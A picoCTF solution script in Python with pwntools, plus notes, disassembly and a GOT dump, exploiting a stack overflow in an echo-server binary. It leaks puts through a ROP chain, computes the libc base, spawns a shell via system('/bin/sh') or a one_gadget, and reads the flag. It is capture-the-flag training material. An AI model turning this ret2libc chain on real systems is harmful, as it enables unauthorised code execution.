'''
tags: `bof`, `ret2libc`, `ROP`, `one gadget`

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'

ret address @0x007fffffffe8f8
input size (136 + 8) to overwrite return address

`scanf` will automatically append null byte at the end
-> unable to leak offsets
-? do i need to leak? => ASLR enable?

`do_stuff`
   0x00000000004006d8 <+0>:     push   rbp
   0x00000000004006d9 <+1>:     mov    rbp,rsp
   0x00000000004006dc <+4>:     sub    rsp,0x90
   0x00000000004006e3 <+11>:	mov    QWORD PTR [rbp-0x10],0x0
   0x00000000004006eb <+19>:	lea    rax,[rbp-0x80]
   0x00000000004006ef <+23>:	mov    rsi,rax
   0x00000000004006f2 <+26>:	lea    rdi,[rip+0x23b]        # 0x400934 "%[^\n]"
   0x00000000004006f9 <+33>:	mov    eax,0x0
   0x00000000004006fe <+38>:	call   0x400580 <__isoc99_scanf@plt>    # scanf("%[^\n]", s), char s[112]
   0x0000000000400703 <+43>:	lea    rax,[rbp-0x81]
   0x000000000040070a <+50>:	mov    rsi,rax
   0x000000000040070d <+53>:	lea    rdi,[rip+0x226]        # 0x40093a
   0x0000000000400714 <+60>:	mov    eax,0x0
   0x0000000000400719 <+65>:	call   0x400580 <__isoc99_scanf@plt>
   0x000000000040071e <+70>:	mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000400726 <+78>:	jmp    0x40075b <do_stuff+131>
   0x0000000000400728 <+80>:	lea    rdx,[rbp-0x80]
   0x000000000040072c <+84>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400730 <+88>:	add    rax,rdx
   0x0000000000400733 <+91>:	movzx  eax,BYTE PTR [rax]
   0x0000000000400736 <+94>:	movsx  eax,al
   0x0000000000400739 <+97>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040073d <+101>:	mov    rsi,rdx
   0x0000000000400740 <+104>:	mov    edi,eax
   0x0000000000400742 <+106>:	call   0x400677 <convert_case>
   0x0000000000400747 <+111>:	mov    ecx,eax
   0x0000000000400749 <+113>:	lea    rdx,[rbp-0x80]
   0x000000000040074d <+117>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400751 <+121>:	add    rax,rdx
   0x0000000000400754 <+124>:	mov    BYTE PTR [rax],cl
   0x0000000000400756 <+126>:	add    QWORD PTR [rbp-0x8],0x1
   0x000000000040075b <+131>:	cmp    QWORD PTR [rbp-0x8],0x63
   0x0000000000400760 <+136>:	jbe    0x400728 <do_stuff+80>
   0x0000000000400762 <+138>:	lea    rax,[rbp-0x80]
   0x0000000000400766 <+142>:	mov    rdi,rax
   0x0000000000400769 <+145>:	call   0x400540 <puts@plt>
   0x000000000040076e <+150>:	nop
   0x000000000040076f <+151>:	leave
   0x0000000000400770 <+152>:	ret

got table
gef➤  telescope 0x00000000401000
[!] Unmapped address: '0x00000000401000'
gef➤  telescope 0x00000000601000
0x00000000601000│+0x0000: 0x00000000600e10  →  <_DYNAMIC+0> add DWORD PTR [rax], eax
0x00000000601008│+0x0008: 0x007ffff7ffe170  →  0x0000000000000000
0x00000000601010│+0x0010: 0x007ffff7dea820  →  <_dl_runtime_resolve_xsave+0> push rbx
0x00000000601018│+0x0018: 0x007ffff7a62a30  →  <puts+0> push r13
0x00000000601020│+0x0020: 0x007ffff7ac7d90  →  <setresgid+0> sub rsp, 0x38
0x00000000601028│+0x0028: 0x007ffff7a6a540  →  <setbuf+0> mov edx, 0x2000
0x00000000601030│+0x0030: 0x007ffff7ac7990  →  <getegid+0> mov eax, 0x6c
0x00000000601038│+0x0038: 0x007ffff7a5df30  →  <__isoc99_scanf+0> push rbx
0x00000000601040│+0x0040: <data_start+0> add BYTE PTR [rax], al
0x00000000601048│+0x0048: <__dso_handle+0> add BYTE PTR [rax], al
'''
from pwn import *

host = 'mercury.picoctf.net'
port = 49464

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

context.binary = elf
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-v']

gdb_script = '''
b do_stuff
b *0x00000000004006d8
b *0x0000000000400762
'''

# gadgets
pop_rdi = 0x0000000000400913
pop_rsi_libc_offset = 0x0000000000023e8a
pop_rdx_libc_offset = 0x0000000000001b96
pop_rdx_pop_rsi_libc_offset = 0x0000000000130889
ret = 0x0000000000400770    # use `ret` to align stack

# plt
puts_plt = elf.plt['puts']
main_plt = elf.symbols['main']
do_stuff_plt = elf.symbols['do_stuff']

# got
puts_got = elf.got['puts']
print (hex(puts_got))
print (hex(puts_plt))

# libc
puts_offset = libc.symbols['puts']

# one_gadget
## rsp & 0xf == 0, rcx == NULL
one_gadget_0 = 0x4f365
## [rsp + 0x40] == NULL
one_gadget_1 = 0x4f3c2
## [rsp + 0x70] == NULL
one_agdget_2 = 0x10a45c

def conn():
    if args.EXPLOIT:
        r = remote(host, port)
    else:
        import os
        r = process([elf.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    return r

def solve(r):
    r.recvuntil(b'WeLcOmE To mY EcHo sErVeR!\n')
    padding = cyclic_find(0x6261616a)
    payload = b'a' * padding
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(do_stuff_plt)
    r.sendline(payload)
    r.recvline()
    puts_addr = int.from_bytes(r.recvline()[:-1], 'little')
    libc.address = puts_addr - puts_offset
    if args.ONE_GADGET:
        payload = b'a' * padding
        payload += p64(libc.address + one_gadget_1)
        payload += b'a' * cyclic_find(0x61616171)
        r.sendline(payload)
    else:
        binsh = next(libc.search(b'/bin/sh\x00'))
        system = libc.symbols['system']
        payload = b'a' * padding
        payload += p64(pop_rdi)
        payload += p64(binsh)
        payload += p64(ret)
        payload += p64(system)
        r.sendline(payload)
    r.recvline()

def flag(r):
    r.sendline(b'cat flag.txt')
    print (r.recvuntil(b'}').decode())

if __name__ == '__main__':
    r = conn()
    solve(r)
    if args.FLAG:
        flag(r)
        r.close()
    else:
        r.interactive()